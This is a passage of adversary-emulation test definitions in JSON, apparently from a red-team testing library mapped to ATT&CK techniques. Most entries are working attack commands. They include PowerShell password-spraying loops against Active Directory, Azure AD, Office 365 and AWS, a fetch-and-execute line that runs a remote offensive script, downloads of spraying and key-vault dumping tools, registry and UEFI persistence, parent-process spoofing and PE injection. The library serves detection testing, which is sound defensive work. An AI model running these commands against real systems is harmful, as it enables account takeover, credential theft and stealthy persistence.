			"command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Password spray all Azure AD users with a single password",
		"auto_generated_guid": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"password": {
				"description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
				"type": "string",
				"default": "P@ssw0rd!"
			},
			"valid_username": {
				"description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>",
				"type": "string",
				"default": "bruce.wayne@contoso.com"
			},
			"valid_password": {
				"description": "Valid password to authenticate as valid_username in the <valid_ms_account>",
				"type": "string",
				"default": "iamthebatman"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - DomainPasswordSpray Attacks",
		"auto_generated_guid": "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Password Spray Invoke-DomainPasswordSpray Light",
		"auto_generated_guid": "b15bc9a5-a4f3-4879-9304-ea0011ace63a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_limit": {
				"description": "The max number of users to put in the list when running the prereq_command",
				"type": "integer",
				"default": 200
			},
			"password": {
				"description": "The password to try for each user in users.txt",
				"type": "string",
				"default": "Spring2020"
			}
		},
		"dependencies": [
			{
				"description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
				"prereq_command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)",
		"auto_generated_guid": "f3a10056-0160-4785-8744-d9bd7c12dc39",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"password": {
				"description": "Single password to try against the list of user accounts",
				"type": "string",
				"default": "P@ssword1"
			},
			"user_list": {
				"description": "File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)",
				"type": "string",
				"default": "$env:temp\\T1110.003UserList.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Password Spray using Kerbrute Tool",
		"auto_generated_guid": "c6f25ec3-6475-47a9-b75d-09ac593c5ecb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domaincontroller": {
				"description": "Domain controller where test will be run",
				"type": "string",
				"default": "$ENV:userdnsdomain"
			},
			"domain": {
				"description": "Domain where you will be testing",
				"type": "string",
				"default": "$ENV:userdomain"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
			},
			{
				"description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "AWS - Password Spray an AWS using GoAWSConsoleSpray",
		"auto_generated_guid": "9c10d16b-20b1-403a-8e67-50ef7117ed4e",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"aws_account_id": {
				"description": "ID of the AWS account",
				"type": "string",
				"default": "XXXXXXXX"
			}
		},
		"dependencies": [
			{
				"description": "Check if go is installed\n",
				"prereq_command": "go version\n",
				"get_prereq_command": "echo Install GO\n"
			}
		],
		"executor": {
			"command": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n",
			"cleanup_command": "rm -rf /tmp/GoAWSConsoleSpray\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1110.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create registry persistence via AppCert DLL",
		"auto_generated_guid": "a5ad6104-5bab-4c43-b295-b4c44c7c6b05",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_path": {
				"description": "path of dll to use",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1546.009\\bin\\AtomicTest.dll"
			},
			"reboot": {
				"description": "Set value to $true if you want to automatically reboot the machine",
				"type": "string",
				"default": "$false"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "File to copy must exist on disk at specified location (#{dll_path})\n",
				"prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll\" -OutFile \"#{dll_path}\"\n"
			}
		],
		"executor": {
			"command": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n",
			"cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f\nRemove-Item C:\\Users\\Public\\AtomicTest.dll -Force\nRemove-Item C:\\Users\\Public\\AtomicTest.txt -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.009",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "UEFI Persistence via Wpbbin.exe File Creation",
		"auto_generated_guid": "b8a49f03-e3c4-40f2-b7bb-9e8f8fdddbf1",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"command": "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n",
			"cleanup_command": "echo \"Removing %systemroot%\\wpbbin.exe\" \nRemove-Item -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n",
			"elevation_required": true
		},
		"attack_technique": "T1542.001",
		"phases": ["defense-evasion", "persistence"]
	},
	{
		"name": "Parent PID Spoofing using PowerShell",
		"auto_generated_guid": "069258f4-2162-46e9-9a25-c9c6c56150d2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"parent_process_name": {
				"description": "Name of the parent process",
				"type": "string",
				"default": "explorer"
			},
			"spawnto_process_path": {
				"description": "Path of the process to spawn",
				"type": "path",
				"default": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
			},
			"dll_process_name": {
				"description": "Name of the created process from the injected dll",
				"type": "string",
				"default": "calculator"
			},
			"dll_path": {
				"description": "Path of the dll to inject",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1134.004\\bin\\calc.dll"
			},
			"spawnto_process_name": {
				"description": "Name of the process to spawn",
				"type": "string",
				"default": "iexplore"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL to inject must exist on disk at specified location (#{dll_path})\n",
				"prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll\" -OutFile \"#{dll_path}\"\n"
			},
			{
				"description": "PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n",
				"prereq_command": "if (Test-Path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1\" -OutFile \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n"
			}
		],
		"executor": {
			"command": ". \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n",
			"cleanup_command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Parent PID Spoofing - Spawn from Current Process",
		"auto_generated_guid": "14920ebd-1d61-491a-85e0-fe98efe37f25",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_path": {
				"description": "File path or name of process to spawn",
				"type": "path",
				"default": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			},
			"parent_pid": {
				"description": "PID of process to spawn from",
				"type": "string",
				"default": "$PID"
			},
			"command_line": {
				"description": "Specified command line to use",
				"type": "string",
				"default": "-Command Start-Sleep 10"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Parent PID Spoofing - Spawn from Specified Process",
		"auto_generated_guid": "cbbff285-9051-444a-9d17-c07cd2d230eb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"parent_pid": {
				"description": "PID of process to spawn from",
				"type": "string",
				"default": "$PID"
			},
			"test_guid": {
				"description": "Defined test GUID",
				"type": "string",
				"default": "12345678-1234-1234-1234-123456789123"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Parent PID Spoofing - Spawn from svchost.exe",
		"auto_generated_guid": "e9f2b777-3123-430b-805d-5cedc66ab591",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_line": {
				"description": "Specified command line to use",
				"type": "string",
				"default": "-Command Start-Sleep 10"
			},
			"file_path": {
				"description": "File path or name of process to spawn",
				"type": "path",
				"default": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Parent PID Spoofing - Spawn from New Process",
		"auto_generated_guid": "2988133e-561c-4e42-a15f-6281e6a9b2db",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_line": {
				"description": "Specified command line to use",
				"type": "string",
				"default": "-Command Start-Sleep 10"
			},
			"file_path": {
				"description": "File path or name of process to spawn",
				"type": "path",
				"default": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			},
			"parent_name": {
				"description": "Parent process to spoof from",
				"type": "path",
				"default": "$Env:windir\\System32\\notepad.exe"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Azure - Dump All Azure Key Vaults with Microburst",
		"auto_generated_guid": "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "T1082Az"
			},
			"output_file": {
				"description": "File to dump results to",
				"type": "string",
				"default": "$env:temp\\T1528Test1.txt"
			},
			"subscription_id": {
				"description": "Azure subscription id to search",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The Get-AzurePasswords script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n"
			},
			{
				"description": "The Azure RM module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureRM -Force -allowclobber\n"
			},
			{
				"description": "The Azure module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name Azure -Force -allowclobber\n"
			}
		],
		"executor": {
			"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '#{subscription_id}' > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1528",
		"phases": ["credential-access"]
	},
	{
		"name": "Process Discovery - ps",
		"auto_generated_guid": "4ff64f0b-aaf2-4866-b39d-38d9791407cc",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "path of output file",
				"type": "path",
				"default": "/tmp/loot.txt"
			}
		},
		"executor": {
			"command": "ps >> #{output_file}\nps aux >> #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Process Discovery - tasklist",
		"auto_generated_guid": "c5806a4f-62b8-4900-980b-c7ec004e9908",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "tasklist\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Process Discovery - Get-Process",
		"auto_generated_guid": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-Process\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Process Discovery - get-wmiObject",
		"auto_generated_guid": "b51239b4-0129-474f-a2b4-70f855b9f2c2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "get-wmiObject -class Win32_Process\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Process Discovery - wmic process",
		"auto_generated_guid": "640cbf6d-659b-498b-ba53-f6dd1a1cc02c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic process get /format:list\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Discover Specific Process - tasklist",
		"auto_generated_guid": "11ba69ee-902e-4a0f-b3b6-418aed7d7ddb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_to_enumerate": {
				"description": "Process name string to search for.",
				"type": "string",
				"default": "lsass"
			}
		},
		"executor": {
			"command": "tasklist | findstr #{process_to_enumerate}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Process Discovery - Process Hacker",
		"auto_generated_guid": "966f4c16-1925-4d9b-8ce0-01334ee0867d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"processhacker_exe": {
				"description": "Process hacker installation executables.",
				"type": "string",
				"default": "ProcessHacker.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Process Hacker must be installed in the location",
				"prereq_command": "if (Test-Path \"c:\\Program Files\\Process Hacker 2\\#{processhacker_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading Process Hacker\nNew-Item -Type Directory \"C:\\Temp\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://versaweb.dl.sourceforge.net/project/processhacker/processhacker2/processhacker-2.39-setup.exe\" -OutFile \"C:\\Temp\\ExternalPayloads\\processhacker-2.39-setup.exe\"\nWrite-Host Installing Process Hacker\nStart-Process \"c:\\Temp\\ExternalPayloads\\processhacker-2.39-setup.exe\" -Wait -ArgumentList \"/s\""
			}
		],
		"executor": {
			"command": "Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Process Discovery - PC Hunter",
		"auto_generated_guid": "b4ca838d-d013-4461-bf2c-f7132617b409",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pchunter64_exe": {
				"description": "Process hacker installation executables.",
				"type": "string",
				"default": "PChunter64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PCHunter must be present in device",
				"prereq_command": "if (Get-ChildItem -Path C:\\ -Include *PCHunter64* -File -Recurse -ErrorAction SilentlyContinue) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading PC Hunter\nNew-Item -Type Directory \"C:\\Temp\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.snapfiles.com/directdl/PCHunter_free.zip\" -OutFile \"C:\\Temp\\ExternalPayloads\\PCHunter_free.zip\"\nExpand-Archive -LiteralPath 'C:\\Temp\\ExternalPayloads\\PCHunter_free.zip' -DestinationPath C:\\Temp\\ExternalPayloads\nWrite-Host Unzipping Installing Process Hunter"
			}
		],
		"executor": {
			"command": "Start-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\#{pchunter64_exe}\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1057",
		"phases": ["discovery"]
	},
	{
		"name": "Portable Executable Injection",
		"auto_generated_guid": "578025d5-faa9-4f6d-8390-aae739d503e1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_binary": {
				"description": "PE binary",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055.002\\bin\\RedInjection.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Portable Executable to inject must exist at specified location (#{exe_binary})\n",
				"prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe\" -OutFile \"#{exe_binary}\"\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1055.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Testing usage of uncommonly used port with PowerShell",
		"auto_generated_guid": "21fe622f-8e53-4b31-ba83-6d333c2583f4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"port": {
				"description": "Specify uncommon port number",
				"type": "string",
				"default": "8081"
			},
			"domain": {
				"description": "Specify target hostname",
				"type": "string",
				"default": "google.com"
			}
		},
		"executor": {
			"command": "Test-NetConnection -ComputerName #{domain} -port #{port}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1571",
		"phases": ["command-and-control"]
	},
	{
		"name": "Testing usage of uncommonly used port",
		"auto_generated_guid": "5db21e1d-dd9c-4a50-b885-b1e748912767",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"port": {
				"description": "Specify uncommon port number",
				"type": "string",
				"default": "8081"
			},
			"domain": {
